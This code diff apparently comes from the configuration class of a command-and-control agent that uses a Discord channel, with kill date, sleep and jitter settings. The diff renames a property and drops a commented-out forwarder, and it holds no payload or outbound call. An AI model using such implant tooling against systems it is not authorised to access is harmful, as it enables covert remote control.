@@ -18,12 +18,11 @@ namespace Profiles
 {
     public class Config : IConfig
     {
-        public IProfile currentConfig { get; set; }
+        public IProfile profile { get; set; }
         public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        //public Forwarder forwarder { get; set; }
         public Config()
         {
             uuid = "%UUID%";
@@ -33,8 +32,7 @@ namespace Profiles
             this.sleep = sleep;
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.currentConfig = new Discord();
-            //this.forwarder = new Forwarder();
+            this.profile = new Discord();
         }
     }
     public class Discord : IProfile
